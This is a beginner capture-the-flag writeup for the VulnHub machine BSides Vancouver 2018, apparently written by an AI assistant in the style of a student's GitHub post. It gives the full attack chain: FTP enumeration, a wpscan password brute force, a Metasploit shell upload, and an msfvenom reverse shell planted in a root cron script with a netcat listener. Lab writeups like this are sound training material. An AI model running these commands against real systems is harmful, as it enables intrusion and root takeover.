My bad! I got carried away with the instructions. Here is the report in **English**, written in a concise, "no-fluff" style that real pentest students use for their GitHub writeups.
# Writeup: BSides Vancouver 2018 (VulnHub)

* **Date:** January 2026
* **Target IP:** 192.168.56.112
* **Difficulty:** Beginner / Easy
* **Goal:** Boot-to-Root (Capture the flag in `/root`)

---

## 1. Reconnaissance & Enumeration

### Port Scanning

I started with a standard `nmap` scan to identify open ports and services:

```bash
nmap -p- -A 192.168.56.112 --open

```

**Key findings:**

* **Port 21 (FTP):** Anonymous login is enabled.
* **Port 22 (SSH):** Open (useful if we find credentials).
* **Port 80 (HTTP):** Running Apache. Nmap also hinted at a `/backup_wordpress` directory.

### FTP Enumeration

Logging in as `anonymous` allowed me to download a file named `user.txt.bk`. This file contained a list of potential usernames:

* `abatchy`, `john`, `mai`, `anne`, `doomguy`

### Web Enumeration

Navigating to `http://192.168.56.112/backup_wordpress` confirmed a WordPress installation. I used `wpscan` to enumerate users:

```bash
wpscan --url http://192.168.56.112/backup_wordpress/ --enumerate u

```

Confirmed users: `admin`, `john`.

---

## 2. Gaining Access

### Password Brute Force

Since I had the username `john`, I ran a dictionary attack using `rockyou.txt`:

```bash
wpscan --url http://192.168.56.112/backup_wordpress --username john --wordlist /usr/share/wordlists/rockyou.txt

```

**Credentials Found:** `john : enigma`

### Initial Shell

With admin access to WordPress, I used Metasploit's `wp_admin_shell_upload` module to get a Meterpreter session:

```bash
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS 192.168.56.112
set TARGETURI /backup_wordpress
set USERNAME john
set PASSWORD enigma
exploit

```

Session opened successfully.

---

## 3. Privilege Escalation

### System Analysis

While checking the system configuration, I looked at the `/etc/crontab` and noticed a recurring task running as **root**:

* Script: `/usr/local/bin/cleanup`

The script had weak permissions, allowing me to modify it.

### Exploitation

I decided to replace the contents of the `cleanup` script with a Python reverse shell payload.

1. **Generate Payload:**
```bash
msfvenom -p cmd/unix/reverse_python lhost=192.168.56.101 lport=9876 R

```


2. **Upload & Replace:** I modified the local version of the script and uploaded it back to the target:
```bash
meterpreter > upload /home/user/Desktop/cleanup /usr/local/bin/cleanup

```


3. **Catching the Shell:**
I started a netcat listener on my machine:
```bash
nc -lvp 9876

```



After about a minute, the cron job executed, giving me a shell with root privileges.

---

## 4. Loot

Final step was to grab the flag:

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/flag.txt

```

---

### Summary

The machine was compromised due to:

1. **Information Leakage:** FTP anonymous access providing a username list.
2. **Weak Credentials:** WordPress user had a password easily found in `rockyou.txt`.
3. **Misconfigured Cron Job:** A root-level script was world-writable.